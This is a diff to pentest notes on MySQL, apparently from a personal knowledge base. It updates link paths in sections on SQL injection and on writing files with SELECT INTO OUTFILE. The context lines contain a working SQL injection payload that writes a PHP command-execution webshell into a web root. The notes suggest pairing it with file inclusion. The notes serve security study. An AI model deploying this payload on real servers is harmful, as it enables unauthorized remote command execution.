@@ -40,7 +40,7 @@ Hint: in the mysql shell, end statements with `;`
 
 ## Injection
 
-- Methodology: [[2 Tech-Specifics/Web/WebApp Attacks/Injection Attacks/SQL Injection|SQL Injection]]
+- Methodology: [[2 Tech-Specifics/Web/Attacks - Web/Injection Attacks/SQL Injection|SQL Injection]]
 - [MySQL injection cheat sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
 
 ## Enumeration
@@ -60,7 +60,7 @@ Hint: in the mysql shell, end statements with `;`
 
 Use [SELECT INTO_OUTFILE](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) to write the query result to a file
 
-- e.g. write a webshell to a file and combine with [[2 Tech-Specifics/Web/WebApp Attacks/File Inclusion|File Inclusion]]
+- e.g. write a webshell to a file and combine with [[2 Tech-Specifics/Web/Attacks - Web/File Inclusion|File Inclusion]]
 - e.g.: `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
 
 # Hardening
